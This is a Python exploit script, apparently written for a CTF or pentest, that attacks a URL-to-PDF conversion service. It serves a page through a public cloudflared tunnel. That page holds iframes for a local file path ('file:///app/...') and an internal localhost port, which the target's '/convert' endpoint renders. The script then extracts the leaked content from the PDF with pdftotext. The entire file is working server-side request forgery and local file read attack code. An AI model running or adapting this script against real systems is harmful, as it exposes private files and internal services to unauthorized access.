import http.server,threading,subprocess,re,time,os,ssl,urllib.request,urllib.parse,urllib.error,pathlib
TARGET=os.environ['TARGET'].rstrip('/'); PORT=8765; ORIGIN=''
class H(http.server.BaseHTTPRequestHandler):
 def log_message(self,fmt,*a): print('HTTP',self.path,fmt%a,flush=True)
 def do_GET(self):
  global ORIGIN
  p=urllib.parse.urlsplit(self.path).path
  if p=='/diag':
   b=b'''<!doctype html><html><body><h1>DIAGTOP</h1><div style="font-size:16px">FILE:</div><iframe width="700" height="500" src="file:///app/app/templates/index.html"></iframe><div style="font-size:16px">LOCALHTTP:</div><iframe width="700" height="500" src="http://127.0.0.1:8000/"></iframe></body></html>'''
  else: b=b'<html><body>OK</body></html>'
  self.send_response(200);self.send_header('Content-Type','text/html');self.send_header('Content-Length',str(len(b)));self.end_headers();self.wfile.write(b)
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
op=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
def get(u,t=30):
 with op.open(urllib.request.Request(u,headers={'User-Agent':'DFO-DIAG'}),timeout=t) as r:return r.status,r.read()
def conv(u):
 d=urllib.parse.urlencode({'url':u}).encode();q=urllib.request.Request(TARGET+'/convert',data=d,headers={'Content-Type':'application/x-www-form-urlencoded'})
 try:
  with op.open(q,timeout=55) as r:b=r.read();s=r.status
 except urllib.error.HTTPError as e:b=e.read();s=e.code
 print('CONVERT',s,len(b),b[:20],flush=True);pathlib.Path('/tmp/diag.pdf').write_bytes(b)
 if b.startswith(b'%PDF'):
  x=subprocess.check_output(['pdftotext','-layout','/tmp/diag.pdf','-'],stderr=subprocess.STDOUT);print('TEXT_BEGIN\n'+x.decode('utf-8','replace')+'\nTEXT_END',flush=True)
s=http.server.ThreadingHTTPServer(('127.0.0.1',PORT),H);threading.Thread(target=s.serve_forever,daemon=True).start()
c=subprocess.Popen(['/tmp/cloudflared','tunnel','--url',f'http://127.0.0.1:{PORT}','--no-autoupdate','--protocol','http2'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
while True:
 l=c.stdout.readline();print('CF',l.rstrip(),flush=True)
 m=re.search(r'https://[a-z0-9-]+\.trycloudflare\.com',l,re.I)
 if m:ORIGIN=m.group();break
for i in range(20):
 try:
  st,b=get(ORIGIN+'/');print('TUNNEL',st,len(b),flush=True);break
 except Exception as e:print('RETRY',repr(e),flush=True);time.sleep(2)
else:raise SystemExit('tunnel failed')
conv(ORIGIN+'/diag?x='+str(time.time_ns()))
